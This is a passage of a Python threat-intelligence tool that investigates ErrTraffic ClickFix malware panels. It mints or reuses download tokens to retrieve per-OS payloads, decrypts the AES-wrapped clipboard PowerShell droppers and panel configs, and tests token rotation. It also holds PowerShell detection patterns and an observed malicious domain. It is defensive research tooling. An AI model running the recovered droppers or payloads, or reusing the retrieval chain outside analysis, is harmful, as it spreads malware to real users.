    if data[:11] == b"#!/bin/zsh" or data[:18] == b"#!/usr/bin/env zsh": return "zsh_script"
    if data[:18] == b"#!/usr/bin/env ba" or data[:17] == b"#!/usr/bin/env sh": return "shell_script"
    if data[:7]  == b"#!/usr/" and b"python" in data[:40]: return "python_script"
    if data[:7]  == b"#!/usr/" and b"perl" in data[:30]: return "perl_script"
    if data[:5]  in (b"#!/bi", b"#!/us"):                 return "shell_script"
    # PowerShell text (no magic — sniff for distinctive opening tokens)
    head = data[:200]
    if (b"FromBase64String" in head or b"[Convert]::" in head
            or b"$PSVersionTable" in head or b"Invoke-WebRequest" in head
            or b"powershell -" in head[:30].lower()):
        return "powershell_text"
    # Catch-all text vs binary
    if data[:5] == b"<?xml":                              return "xml"
    if data[:5] == b"<!DOC" or data[:5] == b"<html":      return "html"
    if data[:1] == b"{" and data[-1:] == b"}":            return "json_maybe"
    if all(0x20 <= b < 0x7f or b in (9, 10, 13) for b in data[:200]):
        return "text"
    return "binary_unknown"


def _payload_os_mismatch_note(os_slot: str, magic: str) -> str | None:
    """Return a short note when the file magic doesn't match the OS slot the
    operator advertised. Returns None when the pairing makes sense.
    Useful for surfacing 'operator served PE in the android slot' findings."""
    if not magic or magic == "empty": return None
    expected = {
        "windows": {"pe_windows", "msi_or_office", "powershell_text"},
        "mac":     {"macho_mac", "macho_fat_mac", "osascript_mac", "shell_script", "bash_script", "zsh_script"},
        "android": {"apk_android", "dex_android"},
        "linux":   {"elf_linux", "shell_script", "bash_script", "zsh_script", "python_script", "perl_script"},
    }
    exp = expected.get(os_slot.lower())
    if exp and magic not in exp:
        return f"OS-slot/magic mismatch — {os_slot} slot served {magic}"
    return None


def _http_get_safe(url: str, headers: dict, timeout: int, *,
                   max_bytes: int = 50_000_000) -> dict:
    """Minimal urllib GET wrapper that always returns a dict — never raises.
    Captures status, content-type, body (capped), and any error string."""
    out = {"url": url, "status": None, "content_type": None,
           "bytes": 0, "body_text_head": None, "body_bytes": None, "error": None,
           "final_url": None, "response_headers": {}}
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = r.read(max_bytes)
            out["status"]         = r.status
            out["content_type"]   = r.headers.get("Content-Type")
            out["bytes"]          = len(data)
            out["body_bytes"]     = data
            out["body_text_head"] = data[:400].decode("utf-8", "replace")
            out["final_url"]      = r.geturl()
            out["response_headers"] = {k.lower(): v for k, v in r.headers.items()}
    except urllib.error.HTTPError as e:
        out["status"] = e.code
        try:
            data = e.read(8192)
            out["body_text_head"] = data[:400].decode("utf-8", "replace")
            out["body_bytes"] = data
            out["content_type"] = e.headers.get("Content-Type") if e.headers else None
        except Exception:
            pass
        out["error"] = f"HTTP {e.code} {e.reason}"
    except Exception as e:
        out["error"] = str(e)[:200]
    return out


def fetch_panel_payload(panel_url: str, os_type: str, *,
                        timeout: int = 15, out_dir: str | None = None,
                        known_token: str | None = None,
                        known_src: str | None = None,
                        known_mode: str | None = None,
                        cache_by_hash: bool = True) -> dict:
    """Recover an ErrTraffic panel payload for one OS, SAFELY.

    Strategy chain (each attempt is recorded in `token_attempts` for transparency):

      0. If `known_token` is supplied (e.g. parsed out of an AES-recovered URL):
         skip token minting and GO STRAIGHT to the v3 RUNTIME download endpoint:
             /api/index.php?a=dl&token=<TOK>&src=<lure>&mode=<mode>
         This is the path the victim's PowerShell uses in the wild and the only
         one whose token policy we control end-to-end.

      1. v3 ADMIN-style mint (per Censys 2026, `errtraffic_payload_downloader.py`):
         GET   /index.php?action=generateDownloadToken&os=<os>      → {"token": "..."}
         GET   /index.php?action=download&token=<TOK>
         NOTE: NO /api/ prefix — this was the v3 bug in earlier versions of this script.

      2. v2 mint (Censys 2026):
         GET   /api/generate-download-token.php?os=<os>             → {"token": "..."}
         GET   /api/download.php?token=<TOK>

      3. v3 RUNTIME mint attempt: GET /api/index.php?a=init&os=<os>&src=<lure>&mode=<mode>
         Many panels return the AES-encrypted clipboard blob here; we try to find a
         token literal in the response body. Best-effort — typically only succeeds
         on misconfigured deployments.

    SAFETY: every saved payload gets a ".bin" suffix (never .exe/.dmg/.apk/.msi),
    is never executed, never opened. SHA-256 is computed for VT lookup. Results
    are cached process-wide by (panel_origin, os_type) so a batch of 50 lures
    pointing to the same panel only fetches once per OS."""
    from urllib.parse import urlparse, urlunparse, urljoin, quote
    if not panel_url.startswith(("http://", "https://")):
        panel_url = "https://" + panel_url
    p = urlparse(panel_url)
    origin = f"{p.scheme}://{p.netloc}"
    cache_key = (origin, os_type.lower(), bool(known_token))
    with _PAYLOAD_CACHE_LOCK:
        cached = _PAYLOAD_CACHE.get(cache_key)
    if cached:
        return {**cached, "from_cache": True}

    out: dict = {
        "panel_origin":          origin,
        "panel_origin_defanged": _defang(origin),
        "os":                    os_type,
        "token":                 known_token,
        "token_source":          ("supplied_by_aes_recovery" if known_token else None),
        "version_used":          None,
        "endpoint_family":       None,    # "v3_runtime" | "v3_admin" | "v2_admin"
        "payload_bytes":         0,
        "sha256":                None,
        "sha1":                  None,
        "md5":                   None,
        "magic":                 None,
        "content_type":          None,
        # Full HTTP response metadata for the binary GET — lets you correlate
        # rotation / CDN / origin without keeping the bytes on disk.
        "payload_response_headers": None,
        "payload_filename":      None,   # parsed from Content-Disposition
        "payload_etag":          None,
        "payload_last_modified": None,
        "payload_server":        None,
        "payload_content_length": None,
        "download_url":          None,
        "download_url_defanged": None,
        "saved_path":            None,
        "saved_path_note":       None,
        "errors":                [],
        "token_attempts":        [],
        "from_cache":            False,
    }

    # Headers that mimic the wild victim chain. ErrTraffic v3 panels TDS-filter
    # on UA + Referer + Origin; sending these consistently produces a 200 where
    # a bare urllib request gets 404/403.
    src_param  = (known_src  or p.netloc).lstrip("/")
    mode_param = (known_mode or "cloudflare")
    sess_headers = {
        "User-Agent":       _BROWSER_UA,
        "Accept":           "application/json, text/html, */*",
        "Accept-Language":  "en-US,en;q=0.9",
        # Use the LURE host (src=) as referer when known — that's what the
        # in-the-wild PS one-liner sends and many panels gate on this.
        "Referer":          f"https://{src_param}/",
        "Origin":           f"https://{src_param}",
        "X-Requested-With": "XMLHttpRequest",
    }

    def _try_download(version_label: str, family: str, dl_url: str) -> bool:
        """Hit the download URL; on a real payload (binary content-type OR magic),
        commit it to `out` and return True. Otherwise record diagnostics."""
        att = _http_get_safe(dl_url, sess_headers, timeout, max_bytes=50_000_000)
        rec = {"phase": "download", "version": version_label, "family": family,
               "url": dl_url, "status": att["status"], "content_type": att["content_type"],
               "bytes": att["bytes"], "error": att["error"],
               "body_excerpt": att["body_text_head"]}
        out["token_attempts"].append(rec)
        data = att["body_bytes"] or b""
        if att["status"] != 200 or not data:
            return False
        # Reject obvious HTML error pages even on HTTP 200
        head = data[:512].lstrip()
        ct = (att["content_type"] or "").lower()
        is_html_response = (b"<html" in head[:200].lower() or b"<!doctype" in head[:200].lower()
                            or "text/html" in ct)
        magic = _detect_file_magic(data)
        if is_html_response and not magic and att["bytes"] < 5000:
            rec["error"] = "got HTML body — likely an error page, not a payload"
            return False
        out["payload_bytes"]  = len(data)
        out["sha256"]         = hashlib.sha256(data).hexdigest()
        out["sha1"]           = hashlib.sha1(data).hexdigest()
        out["md5"]            = hashlib.md5(data).hexdigest()
        out["magic"]          = magic
        out["content_type"]   = att["content_type"]
        out["version_used"]   = version_label
        out["endpoint_family"] = family
        out["download_url"]   = dl_url
        out["download_url_defanged"] = _defang(dl_url)
        # Capture the FULL response headers for the binary GET. These travel in
        # the JSON even in metadata-only mode (bytes discarded), so you can
        # cluster/rotate on Server / ETag / Last-Modified / filename without
        # ever storing the payload.
        hdrs = att.get("response_headers") or {}
        out["payload_response_headers"] = hdrs
        out["payload_etag"]          = hdrs.get("etag")
        out["payload_last_modified"] = hdrs.get("last-modified")
        out["payload_server"]        = hdrs.get("server")
        out["payload_content_length"] = hdrs.get("content-length")
        cd = hdrs.get("content-disposition") or ""
        mfn = re.search(r"filename\*?=(?:UTF-8'')?\"?([^\";]+)\"?", cd, re.I)
        out["payload_filename"] = (mfn.group(1).strip() if mfn else None)
        # Stash bytes for the (optional) disk-save step; popped before the dict
        # is serialized. In metadata-only mode the save step discards them.
        out["__bytes__"]      = data
        return True

    def _try_mint(version_label: str, family: str, mint_url: str, dl_tpl: str) -> bool:
        """Hit a token-mint endpoint, parse JSON for token/downloadToken, then
        invoke `_try_download`. Returns True on full success."""
        att = _http_get_safe(mint_url, sess_headers, timeout, max_bytes=64_000)
        rec = {"phase": "mint", "version": version_label, "family": family,
               "url": mint_url, "status": att["status"], "content_type": att["content_type"],
               "bytes": att["bytes"], "error": att["error"],
               "body_excerpt": att["body_text_head"]}
        out["token_attempts"].append(rec)
        if att["status"] != 200 or not att["body_bytes"]:
            return False
        # Try strict JSON first, then loose regex over the body (some panels
        # wrap the JSON in JS).
        tok = None
        try:
            j = json.loads(att["body_bytes"])
            if isinstance(j, dict):
                tok = j.get("token") or j.get("downloadToken") or j.get("download_token")
        except Exception:
            pass
        if not tok:
            m = re.search(r'"(?:token|downloadToken|download_token)"\s*:\s*"([A-Fa-f0-9]{16,})"',
                          att["body_text_head"] or "")
            if m: tok = m.group(1)
        if not tok:
            rec["error"] = ("got HTTP 200 but no token field in body "
                            f"({att['bytes']}B / {att['content_type']})")
            return False
        out["token"]        = tok
        out["token_source"] = f"minted_via_{family}"
        return _try_download(version_label, family, dl_tpl % quote(tok, safe=""))

    # ─── Strategy 0: short-circuit on a known token (from AES recovery) ────────
    if known_token:
        dl_url = (f"{origin}/api/index.php?a=dl&token={quote(known_token, safe='')}"
                  f"&src={quote(src_param, safe='')}&mode={quote(mode_param, safe='')}")
        if _try_download("v3", "v3_runtime", dl_url):
            return _finalize_payload_save(out, p, os_type, out_dir)
        out["errors"].append("known-token /a=dl fetch failed (see token_attempts); falling back to mint chain")

    # ─── Strategy 1: v3 admin-style mint (per Censys) ──────────────────────────
    v3a = ERRTRAFFIC_KIT["panel_endpoints_v3_admin"]
    if _try_mint("v3", "v3_admin",
                 f"{origin}{v3a['gen_token']}&os={quote(os_type, safe='')}",
                 f"{origin}{v3a['download']}&token=%s"):
        return _finalize_payload_save(out, p, os_type, out_dir)

    # ─── Strategy 2: v2 mint ───────────────────────────────────────────────────
    v2 = ERRTRAFFIC_KIT["panel_endpoints_v2"]
    if _try_mint("v2", "v2_admin",
                 f"{origin}{v2['gen_token']}?os={quote(os_type, safe='')}",
                 f"{origin}{v2['download']}?token=%s"):
        return _finalize_payload_save(out, p, os_type, out_dir)

    # ─── Strategy 3: v3 runtime mint via /a=init  ──────────────────────────────
    # The v3 init endpoint returns:
    #     {"ok": true, "token": "<full AES-encrypted PowerShell command>"}
    # where the `token` field is NOT a download token but the entire AES PS that
    # the kit writes to the victim's clipboard. We:
    #   1. parse the JSON, extract the `token` field (the AES PS)
    #   2. AES-decrypt the PS locally (vendored AES, never executes)
    #   3. parse the decrypted plaintext for a /api/index.php?a=dl URL
    #   4. extract the REAL download token from that URL
    #   5. hit a=dl with the real token to get the binary
    # This is the kit's actual victim flow, replicated end-to-end with NO browser,
    # NO JS execution, NO clipboard-paste — fully passive static recovery.
    init_url = (f"{origin}/api/index.php?a=init&os={quote(os_type, safe='')}"
                f"&src={quote(src_param, safe='')}&mode={quote(mode_param, safe='')}")
    att = _http_get_safe(init_url, sess_headers, timeout, max_bytes=131_072)
    rec = {"phase": "mint", "version": "v3", "family": "v3_runtime_init",
           "url": init_url, "status": att["status"], "content_type": att["content_type"],
           "bytes": att["bytes"], "error": att["error"],
           "body_excerpt": (att["body_text_head"] or "")[:300]}
    out["token_attempts"].append(rec)
    if att["status"] == 200 and att["body_bytes"]:
        # Parse the panel's init JSON
        try:
            j = json.loads(att["body_bytes"])
        except Exception:
            j = None
        if isinstance(j, dict) and j.get("token"):
            aes_ps = j["token"]
            out["init_response_aes_ps"]     = aes_ps          # raw AES PS as served
            out["init_response_aes_ps_sha256"] = hashlib.sha256(aes_ps.encode("utf-8")).hexdigest()
            # Decrypt the AES PS locally to extract the real dl URL+token
            try:
                aes_rec = try_recover_clipboard_aes(aes_ps)
            except Exception as e:
                aes_rec = {"ok": False, "reason": f"AES decrypt exception: {str(e)[:200]}"}
            out["init_response_aes_decrypt"] = {
                "ok":             aes_rec.get("ok", False),
                "plaintext":      aes_rec.get("plaintext_excerpt"),
                "plaintext_sha256": aes_rec.get("sha256"),
                "plaintext_bytes": aes_rec.get("plaintext_bytes"),
                "dl_url":         (aes_rec.get("urls_in_plaintext") or [None])[0],
                "errtraffic_payload_url": aes_rec.get("errtraffic_payload_url"),
                "reason":         aes_rec.get("reason"),
            }
            ehp = aes_rec.get("errtraffic_payload_url") or {}
            real_token = ehp.get("token")
            if real_token:
                out["token"]        = real_token
                out["token_source"] = "minted_via_v3_runtime_init_AES_decrypt"
                # Build dl URL from the AES-decrypted fields (use exactly what the
                # kit said to use — not our guesses for src/mode)
                eh_src  = ehp.get("src")  or src_param
                eh_mode = ehp.get("mode") or mode_param
                dl_url = (f"{origin}/api/index.php?a=dl&token={quote(real_token, safe='')}"
                          f"&src={quote(eh_src, safe='')}&mode={quote(eh_mode, safe='')}")
                if _try_download("v3", "v3_runtime", dl_url):
                    return _finalize_payload_save(out, p, os_type, out_dir)
            else:
                rec["error"] = ("init returned JSON with token field, AES decrypt "
                                f"{'succeeded' if aes_rec.get('ok') else 'failed'}, "
                                "but no dl URL/token surfaced in plaintext")
        else:
            rec["error"] = ("init returned 200 but no 'token' field in JSON response "
                            f"(content-type {att['content_type']})")

    # ─── Strategy 4: BW v2 generation /a=init→dl with uj=/rlm= param schema ────
    # The BW v2 generation returns a simpler init shape:
    #     {"token":"<64-char hex>"}           (no "ok" field, no AES wrap)
    # The hex token is the dl token directly. Download URL schema also rotated:
    #     /api/index.php?a=dl&uj=<hex>&rlm=<b64url-of-per-deploy-id>
    # The `rlm` value binds the token to a specific lure-source / theme; if we
    # don't have a captured one we try a small list of observed values + the
    # default mode-encoded fallback. (Identifying the right rlm typically
    # requires capturing it from the live victim chain via --payload-token
    # /--payload-src; this strategy is the best-effort speculative path.)
    bw_token = None
    # Re-use the init response we already fetched in Strategy 3 (avoid double-fetch).
    init_body = att if 'att' in locals() and isinstance(att, dict) else None
    if init_body and init_body.get("status") == 200 and init_body.get("body_bytes"):
        try:
            j2 = json.loads(init_body["body_bytes"])
        except Exception:
            j2 = None
        if isinstance(j2, dict):
            cand = j2.get("token")
            if isinstance(cand, str) and re.fullmatch(r'[0-9a-fA-F]{64}', cand or ""):
                bw_token = cand
    if bw_token:
        out["token"]        = bw_token
        out["token_source"] = "minted_via_v3_bwv2_init_plain_hex"
        # Try observed rlm values, then a few defaults. Order:
        #   1. caller-supplied --payload-src (interpreted as rlm here)
        #   2. observed deployment values
        #   3. mode-based encoded fallback
        rlm_candidates = []
        if src_param and src_param != "clickfix":
            rlm_candidates.append(src_param)
        rlm_candidates += ["AXV5gj"]                      # observed on slndcdnclaud.beer
        # Fallback: base64-url of the mode_param (kit's mode codes appear bytes 1..3)
        try:
            rlm_fb = base64.urlsafe_b64encode(b"\x01" + mode_param.encode()[:3]).decode().rstrip("=")
            rlm_candidates.append(rlm_fb)
        except Exception: pass
        for rlm in rlm_candidates:
            dl_url = (f"{origin}/api/index.php?a=dl&uj={quote(bw_token, safe='')}"
                      f"&rlm={quote(rlm, safe='')}")
            if _try_download("v3_bwv2", "v3_bwv2_runtime", dl_url):
                return _finalize_payload_save(out, p, os_type, out_dir)

    # All strategies exhausted
    msg = ("all five endpoint strategies failed: "
           "known-token /a=dl, v3-admin /index.php?action=, v2 /api/generate-download-token.php, "
           "v3-runtime /a=init→AES→dl, v3-bwv2 /a=init→dl?uj=. Panel may be down, gated on a "
           "cookie/UA we don't simulate, the kit has been updated, or `rlm` requires a value "
           "captured from a live victim chain (pass --payload-src <captured-rlm>). See "
           "token_attempts for per-endpoint diagnostics.")
    out["errors"].append(msg)
    with _PAYLOAD_CACHE_LOCK:
        _PAYLOAD_CACHE[cache_key] = out
    return out


def _finalize_payload_save(out: dict, parsed_url, os_type: str,
                           out_dir: str | None) -> dict:
    """Helper: write the recovered artifacts to disk (payload binary + raw AES
    clipboard PS + decrypted plaintext PS, all when present) and cache the result.

    Writes (when `out_dir` is set and the data is present):
      <out_dir>/<host>.<os>.<sha12>.bin             — the actual binary (.bin suffix, never .exe)
      <out_dir>/<host>.<os>.<sha12>.clipboard.ps1   — raw AES-encrypted PS the panel served
      <out_dir>/<host>.<os>.<sha12>.decoded.ps1     — AES-decrypted plaintext PS

    All three live side-by-side so an analyst can pivot: from the .bin → VT
    lookup, from .clipboard.ps1 → what the victim would have pasted, from
    .decoded.ps1 → the exact dropper logic + stager URL/token."""
    data = out.pop("__bytes__", b"") or b""
    if not out_dir and out.get("sha256"):
        # Metadata-only mode (the default). We computed sha256/sha1/md5, file
        # magic, size, and full response headers above; now drop the bytes so
        # nothing malicious lands on disk.
        out["capture_mode"]    = "metadata_only"
        out["saved_path_note"] = ("metadata-only: payload bytes discarded after hashing "
                                   "(sha256/sha1/md5 + magic + size + HTTP headers retained). "
                                   "Re-run with --payload-files to persist the binary.")
    if out_dir and out.get("sha256"):
        out["capture_mode"] = "files"
        try:
            os.makedirs(out_dir, exist_ok=True)
            stem = _safe_filename(parsed_url.netloc) + f".{os_type}.{out['sha256'][:12]}"
            # Binary payload
            if data:
                bin_path = os.path.join(out_dir, stem + ".bin")
                with open(bin_path, "wb") as fh: fh.write(data)
                out["saved_path"] = bin_path
                out["saved_path_note"] = ("Saved with .bin suffix (defanged). DO NOT rename to "
                                          ".exe/.dmg/.apk/.msi and double-click. Submit SHA-256 "
                                          "to VirusTotal for downstream attribution.")
            # Raw AES PS (the clipboard string as served by the panel)
            if out.get("init_response_aes_ps"):
                clip_path = os.path.join(out_dir, stem + ".clipboard.ps1")
                with open(clip_path, "w", encoding="utf-8") as fh:
                    fh.write(out["init_response_aes_ps"])
                out["saved_clipboard_path"] = clip_path
            # AES-decrypted plaintext PS (the actual dropper logic)
            ird = out.get("init_response_aes_decrypt") or {}
            if ird.get("plaintext"):
                dec_path = os.path.join(out_dir, stem + ".decoded.ps1")
                with open(dec_path, "w", encoding="utf-8") as fh:
                    fh.write(ird["plaintext"])
                out["saved_decoded_path"] = dec_path
        except Exception as e:
            out["errors"].append(f"disk save failed: {str(e)[:120]}")
    cache_key = (out["panel_origin"], os_type.lower(),
                 bool(out.get("token_source") == "supplied_by_aes_recovery"))
    with _PAYLOAD_CACHE_LOCK:
        _PAYLOAD_CACHE[cache_key] = out
    return out


def detect_rotation_for_panel(panel_url: str, *, runs: int, timeout: int = 15,
                                src: str | None = None, mode: str = "cloudflare",
                                progress_fh=None) -> dict:
    """Hit /api/index.php?a=init N times for each OS and record the AES PS sha256,
    decrypted plaintext sha256, AND embedded download token across runs.

    For each OS we return:
      - n_runs                 — total successful runs
      - distinct_aes_ps        — number of unique AES PS responses
      - distinct_decrypted     — number of unique AES-decrypted plaintexts
      - distinct_dl_tokens     — number of unique download tokens
      - aes_ps_hashes / decrypted_hashes / tokens — the per-run lists

    A 'rotating' panel produces distinct_aes_ps ≈ n_runs (true polymorphism) but
    might still produce 1 distinct_dl_token (one token wrapped in N encryptions)
    OR N distinct_dl_tokens (true per-victim tokens). The token count is the
    interesting signal — it tells you if defenders can track this kit by token.

    Pure observation. Burns N requests per OS against the live panel."""
    from urllib.parse import urlparse, quote
    results = {"panel_url": panel_url, "panel_url_defanged": _defang(panel_url),
               "runs_per_os": runs, "per_os": {}}
    p = urlparse(panel_url if panel_url.startswith(("http", "https"))
                 else "https://" + panel_url)
    origin   = f"{p.scheme or 'https'}://{p.netloc}"
    src_val  = src or p.hostname
    init_url = f"{origin}/api/index.php?a=init"
    headers  = {"User-Agent": _BROWSER_UA,
                "Accept": "application/json, text/html, */*",
                "Referer": f"https://{src_val}/", "Origin": f"https://{src_val}",
                "X-Requested-With": "XMLHttpRequest"}
    for os_type in ERRTRAFFIC_KIT["supported_os"]:
        aes_ps_hashes  = []
        decrypted_hashes = []
        tokens           = []
        errors           = []
        for i in range(runs):
            if progress_fh:
                print(f"  [rotation-probe] {panel_url} os={os_type} run={i+1}/{runs}",
                      file=progress_fh)
            url = (f"{init_url}&os={quote(os_type, safe='')}"
                   f"&src={quote(src_val, safe='')}&mode={quote(mode, safe='')}")
            att = _http_get_safe(url, headers, timeout, max_bytes=131_072)
            if att["status"] != 200 or not att["body_bytes"]:
                errors.append(f"run{i+1}: status={att['status']} err={att['error']}")
                continue
            try:    j = json.loads(att["body_bytes"])
            except Exception: j = None
            if not (isinstance(j, dict) and j.get("token")):
                errors.append(f"run{i+1}: no token field in response")
                continue
            aes_ps = j["token"]
            aes_ps_hashes.append(hashlib.sha256(aes_ps.encode("utf-8")).hexdigest())
            try:    rec = try_recover_clipboard_aes(aes_ps)
            except Exception as e: rec = {"ok": False, "reason": str(e)[:120]}
            if rec.get("ok") and rec.get("sha256"):
                decrypted_hashes.append(rec["sha256"])
                ehp = rec.get("errtraffic_payload_url") or {}
                if ehp.get("token"): tokens.append(ehp["token"])
        results["per_os"][os_type] = {
            "n_runs":                len(aes_ps_hashes),
            "distinct_aes_ps":       len(set(aes_ps_hashes)),
            "distinct_decrypted":    len(set(decrypted_hashes)),
            "distinct_dl_tokens":    len(set(tokens)),
            "aes_ps_hashes":         aes_ps_hashes,
            "decrypted_hashes":      decrypted_hashes,
            "dl_tokens":             tokens,
            "errors":                errors,
        }
    # Overall verdict
    meta = {
        "rotates_aes_ps":     False,
        "rotates_decrypted":  False,
        "rotates_token":      False,
        "interpretation":     None,
    }
    for os_type, r in results["per_os"].items():
        if r["distinct_aes_ps"]    > 1: meta["rotates_aes_ps"]    = True
        if r["distinct_decrypted"] > 1: meta["rotates_decrypted"] = True
        if r["distinct_dl_tokens"] > 1: meta["rotates_token"]     = True
    if meta["rotates_token"]:
        meta["interpretation"] = ("Per-request token rotation observed — token is NOT a "
                                   "stable IOC. Defenders cannot track this operator by token.")
    elif meta["rotates_aes_ps"] and not meta["rotates_token"]:
        meta["interpretation"] = ("AES wrapper rotates per request (different key/IV each time) "
                                   "but the embedded DOWNLOAD TOKEN is constant. "
                                   "Polymorphism defeats hash-based detection of the clipboard "
                                   "string but the token is a STABLE IOC defenders can track.")
    elif not meta["rotates_aes_ps"]:
        meta["interpretation"] = ("AES PS is byte-identical across all runs — "
                                   "panel served a fully-cached response. "
                                   "Hash-based detection works against this kit version.")
    results["meta"] = meta
    return results


def probe_panel_envelopes(panel_url: str, *, host: str | None = None,
                           timeout: int = 15, verify_tls: bool = True,
                           progress_fh=None) -> dict:
    """Probe a BW v2 panel's /api/cfg and /api/settings endpoints, decrypt
    the AES-GCM envelope, return the plaintext config dict the operator is
    serving right now. Pure passive HTTP — no JS execution, no auth, no writes.

    Returns:
      {"probed": [str...],          # list of endpoint URLs hit
       "responses": [{
           "url": str, "status": int, "enc": "gcm1"|"q2"|None,
           "q_bytes": int, "key_source": "host_specific"|"default"|None,
           "decrypted": dict|None,   # plaintext JSON on success
           "error": str|None,
       }, ...],
       "summary": {...}}            # mode / enabled / rentalExpired / etc. (flat)
    """
    out = {"probed": [], "responses": [], "summary": {}, "host": host}
    from urllib.parse import urlparse
    origin = f"{urlparse(panel_url).scheme or 'https'}://{urlparse(panel_url).netloc or host or ''}"
    if not origin or origin == "https://":
        out["error"] = "no panel origin"; return out
    # Resolve per-host API_Q2_KEY_HEX if we have one captured for this fleet,
    # else fall back to the documented kit-author default.
    keys_cfg  = ERRTRAFFIC_KIT.get("bw_v2_keys", {}) or {}
    host_lc   = (host or "").lower()
    base_key  = (keys_cfg.get("by_host") or {}).get(host_lc) or keys_cfg.get("API_Q2_KEY_HEX")
    key_src   = "host_specific" if (keys_cfg.get("by_host") or {}).get(host_lc) else \
                ("default" if keys_cfg.get("API_Q2_KEY_HEX") else None)

    runtime = ERRTRAFFIC_KIT.get("panel_endpoints_v3_runtime", {})
    bw_v2   = ERRTRAFFIC_KIT.get("bw_v2", {})
    scopes  = bw_v2.get("scopes", {}) or {}
    # Endpoints to try (action_name, scope, url_suffix)
    endpoints = [
        ("cfg",      scopes.get("cfg",      "cfg"), runtime.get("cfg")),
        ("settings", scopes.get("settings", "cfg"), runtime.get("settings")),
    ]
    hdrs = {"User-Agent": _BROWSER_UA,
            "Accept":     "application/json, */*",
            "Referer":    origin + "/",
            "Origin":     origin}
    if progress_fh:
        print(f"[envelope-probe] base_key source: {key_src}", file=progress_fh)
    for action_name, scope, suffix in endpoints:
        if not suffix: continue
        url = (f"{origin}{suffix}"
               f"&os=windows&src={host_lc or ''}&mode=cloudflare"
               if "?" in suffix
               else f"{origin}{suffix}?os=windows&src={host_lc or ''}&mode=cloudflare")
        out["probed"].append(url)
        rec = {"url": url, "url_defanged": _defang(url), "action": action_name,
               "scope": scope, "key_source": key_src,
               "status": None, "enc": None, "q_bytes": 0,
               "decrypted": None, "error": None}
        try:
            att = _http_get_safe(url, hdrs, timeout, max_bytes=131_072)
            rec["status"]       = att["status"]
            rec["content_type"] = att["content_type"]
            rec["bytes"]        = att["bytes"]
            if att["status"] != 200 or not att["body_bytes"]:
                rec["error"] = f"non-200 / empty body ({att['status']}, {att['bytes']}B)"
                out["responses"].append(rec); continue
            try:
                env = json.loads(att["body_bytes"])
            except Exception as je:
                rec["error"] = f"json parse failed: {je}"
                out["responses"].append(rec); continue
            rec["enc"]     = env.get("enc") if isinstance(env, dict) else None
            rec["q_bytes"] = len(env.get("q","") or "") if isinstance(env, dict) else 0
            if not base_key:
                rec["error"] = ("no API_Q2_KEY_HEX available — cannot decrypt. "
                                "Add the per-host key to ERRTRAFFIC_KIT['bw_v2_keys']['by_host'].")
                out["responses"].append(rec); continue
            try:
                plain = decrypt_api_envelope(env, scope=scope, base_key_hex=base_key)
                rec["decrypted"] = plain
                if progress_fh:
                    print(f"[envelope-probe] {action_name}: decrypted "
                          f"({rec['enc']}, scope={scope})", file=progress_fh)
            except Exception as de:
                rec["error"] = f"decrypt failed: {de}"
        except Exception as e:
            rec["error"] = f"probe exception: {e.__class__.__name__}: {e}"
        out["responses"].append(rec)
    # Aggregate the most useful operator-visible fields into a flat summary
    summary = {}
    for r in out["responses"]:
        d = r.get("decrypted") or {}
        if isinstance(d, dict):
            for k in ("mode","enabled","blockBots","rentalExpired","showDelay","os","browser",
                      "panelBaseUrl","apiBase","logUrl","tokenUrl","downloadUrl"):
                if k in d and k not in summary:
                    summary[k] = d[k]
    out["summary"] = summary
    return out


def download_all_os_payloads(panel_url: str, *, timeout: int = 15,
                              out_dir: str | None = None,
                              progress_fh=None,
                              known_token: str | None = None,
                              known_src:   str | None = None,
                              known_mode:  str | None = None) -> dict:
    """Iterate every supported OS, fetch each payload safely, return per-OS
    results + a meta-analysis (same hash across OSes? size deltas? magic types?).

    If `known_token` is supplied (e.g. parsed out of an AES-recovered clipboard URL),
    the runtime /api/index.php?a=dl path is tried FIRST with that token. The mint
    fallbacks still fire if it doesn't yield a payload."""
    results = {}
    for os_type in ERRTRAFFIC_KIT["supported_os"]:
        if progress_fh:
            tok_tag = " (with AES-recovered token)" if known_token else ""
            print(f"  [payload] {panel_url} os={os_type}{tok_tag}", file=progress_fh)
        results[os_type] = fetch_panel_payload(panel_url, os_type,
                                                timeout=timeout, out_dir=out_dir,
                                                known_token=known_token,
                                                known_src=known_src,
                                                known_mode=known_mode)
    # Meta-analysis
    successful = {o: r for o, r in results.items() if r.get("sha256")}
    hashes = {r["sha256"] for r in successful.values()}
    magics = {r["magic"] for r in successful.values() if r.get("magic")}
    return {
        "panel_url":     panel_url,
        "panel_url_defanged": _defang(panel_url),
        "per_os":        results,
        "meta": {
            "successful_os":     sorted(successful.keys()),
            "failed_os":         sorted(set(ERRTRAFFIC_KIT["supported_os"]) - set(successful.keys())),
            "distinct_hashes":   len(hashes),
            "all_same_payload":  len(hashes) == 1 and len(successful) > 1,
            "file_magics":       sorted(magics),
            "sha256_list":       sorted(hashes),
            "size_range":        ({"min": min(r["payload_bytes"] for r in successful.values()),
                                    "max": max(r["payload_bytes"] for r in successful.values())}
                                   if successful else None),
        },
    }


# ============================================================================
# Comprehensive single-IOC investigation (--comprehensive)
# ============================================================================
def classify_input_role(url: str, *, timeout: int = 8, verify_tls: bool = True,
                        known_panel_hosts: set | None = None,
                        retries: int = 1) -> dict:
    """Decide whether `url` is a LURE (compromised site running a loader) or a
    PANEL (the ErrTraffic C2 itself). Signals, weighted:

      1. host match against a known-panel set (caller-supplied — typically built
         from KNOWN_ACTORS + the on-chain resolved getURL of an active contract)
      2. probe GET /api/index.php?a=init&os=windows&src=<host>&mode=cloudflare
         → if response is {"ok": true, "token": "<AES PS...>"} the host IS a panel
      3. probe fallback: if init probe network-errors, retry once before giving up
      4. if everything fails, default to "lure" with low confidence (lures are
         the common case; lure-mode analysis still produces useful output even
         on a fully-down host)

    Returns: {"role": "panel" | "lure", "confidence": float,
              "signals": [str...], "probe": {<probe details + retries>}}"""
    from urllib.parse import urlparse, quote
    # Default to LURE (the common case) with very low confidence. NEVER returns
    # "unknown" — that confused users in the previous output ("ROLE: UNKNOWN
    # (confidence 0.00)" was alarming but actually meant "couldn't reach the
    # probe endpoint"). Better to say "lure (probe failed)" and let downstream
    # lure-mode produce whatever output it can.
    out = {"role": "lure", "confidence": 0.05, "signals": [], "probe": None}
    p = urlparse(url if url.startswith(("http://", "https://")) else "https://" + url)
    host = (p.hostname or "").lower()
    if not host:
        out["signals"].append("invalid_host")
        return out

    # Signal 1 — known-panel hostname (strongest, no network needed)
    if known_panel_hosts and host in {h.lower() for h in known_panel_hosts}:
        out["role"]       = "panel"
        out["confidence"] = 0.95
